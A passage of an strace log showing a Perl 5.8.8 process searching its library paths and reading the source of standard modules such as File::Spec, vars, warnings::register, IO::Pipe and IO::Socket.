=~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
9764  07:29:45.380645 stat64("/etc/perl/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380661 stat64("/etc/perl/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380674 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380687 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380701 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380713 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380727 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380739 stat64("/usr/lib/perl5/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380752 stat64("/usr/share/perl5/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380765 stat64("/usr/share/perl5/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380794 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380836 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380866 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380894 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
9764  07:29:45.380919 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.380934 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.380959 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.380979 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
9764  07:29:45.381053 stat64("/etc/perl/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381067 stat64("/etc/perl/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381080 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381092 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381106 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381118 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381133 stat64("/usr/lib/perl5/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381144 stat64("/usr/lib/perl5/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381157 stat64("/usr/share/perl5/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381168 stat64("/usr/share/perl5/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381181 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381193 stat64("/usr/lib/perl/5.8/vars.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.381207 stat64("/usr/share/perl/5.8/vars.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.381219 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
9764  07:29:45.381238 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
9764  07:29:45.381252 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa28b8) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.381263 _llseek(10, 0, [0], SEEK_CUR) = 0
9764  07:29:45.381321 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
9764  07:29:45.381483 stat64("/etc/perl/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381497 stat64("/etc/perl/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381511 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381524 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381538 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381551 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381565 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381578 stat64("/usr/lib/perl5/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381591 stat64("/usr/share/perl5/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381603 stat64("/usr/share/perl5/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381617 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381630 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbffa25fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.381644 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbffa26ec) = -1 ENOENT (No such file or directory)
9764  07:29:45.381657 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
9764  07:29:45.381678 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
9764  07:29:45.381693 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2408) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.381704 _llseek(11, 0, [0], SEEK_CUR) = 0
9764  07:29:45.381722 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
9764  07:29:45.381954 read(11, "", 4096) = 0
9764  07:29:45.381968 close(11)         = 0
9764  07:29:45.382161 _llseek(10, 1148, [1148], SEEK_SET) = 0
9764  07:29:45.382196 _llseek(10, 0, [1148], SEEK_CUR) = 0
9764  07:29:45.382224 close(10)         = 0
9764  07:29:45.382333 _llseek(8, 594, [594], SEEK_SET) = 0
9764  07:29:45.382365 _llseek(8, 0, [594], SEEK_CUR) = 0
9764  07:29:45.382375 close(8)          = 0
9764  07:29:45.382409 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382424 stat64("/etc/perl/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382438 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382451 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382465 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382478 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382496 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382509 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382522 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382535 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382548 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382561 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382575 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.382588 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
9764  07:29:45.382609 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.382624 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.382636 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.382654 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
9764  07:29:45.383388 brk(0x8218000)    = 0x8218000
9764  07:29:45.389406 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
9764  07:29:45.389861 read(8, "", 4096) = 0
9764  07:29:45.389877 close(8)          = 0
9764  07:29:45.390065 read(6, "", 4096) = 0
9764  07:29:45.390080 close(6)          = 0
9764  07:29:45.390207 stat64("/etc/perl/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390207 stat64("/etc/perl/IO/Pipe.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.390207 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390207 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.390207 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390208 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.390208 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390208 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.390208 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390209 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.390209 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.390209 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
9764  07:29:45.390209 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.390209 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.390210 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.390225 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
9764  07:29:45.391009 _llseek(6, 3425, [3425], SEEK_SET) = 0
9764  07:29:45.391028 _llseek(6, 0, [3425], SEEK_CUR) = 0
9764  07:29:45.391038 close(6)          = 0
9764  07:29:45.391062 stat64("/etc/perl/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391076 stat64("/etc/perl/IO/Socket.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391090 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391103 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391117 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391130 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391144 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391156 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391169 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391181 stat64("/usr/share/perl5/IO/Socket.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391194 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.391206 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
9764  07:29:45.391227 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.391242 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.391253 _llseek(6, 0, [0], SEEK_CUR) = 0
